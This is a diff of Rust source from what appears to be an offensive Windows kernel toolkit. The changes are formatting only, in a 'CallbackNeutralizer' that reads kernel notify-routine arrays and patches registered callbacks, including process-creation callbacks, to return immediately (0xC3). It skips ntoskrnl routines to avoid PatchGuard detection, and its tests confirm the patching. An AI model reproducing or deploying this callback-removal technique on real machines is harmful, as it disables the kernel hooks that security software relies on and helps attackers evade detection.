@@ -89,8 +89,7 @@ impl CallbackNeutralizer {
         // overwriting their CODE causes system instability and PatchGuard
         // detection). When both bounds are 0 (bootstrap didn't resolve them),
         // fall back to skipping only slot[0], the known dispatcher position.
-        let skip_ntoskrnl =
-            self.runtime.ntoskrnl_base != 0 && self.runtime.ntoskrnl_size != 0;
+        let skip_ntoskrnl = self.runtime.ntoskrnl_base != 0 && self.runtime.ntoskrnl_size != 0;
         for i in 0..notify_routines::ARRAY_LEN {
             let slot_kva = base + i * 8;
             let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
@@ -461,7 +460,7 @@ mod tests {
             .neutralize_array(&krw, NotifyArray::CreateProcess)
             .unwrap();
         assert_eq!(n, 0); // slot 0 skipped — nothing neutralized
-        // The routine's entry byte is untouched.
+                          // The routine's entry byte is untouched.
         assert_eq!(krw.get_byte(routine as usize), 0x0);
     }
 
@@ -495,7 +494,7 @@ mod tests {
             .neutralize_array(&krw, NotifyArray::CreateProcess)
             .unwrap();
         assert_eq!(n, 1); // only the outside routine
-        // The ntoskrnl-internal routine is untouched.
+                          // The ntoskrnl-internal routine is untouched.
         assert_eq!(krw.get_byte(routine_inside as usize), 0x0);
         assert_eq!(krw.get_byte(routine_outside as usize), 0xC3);
     }
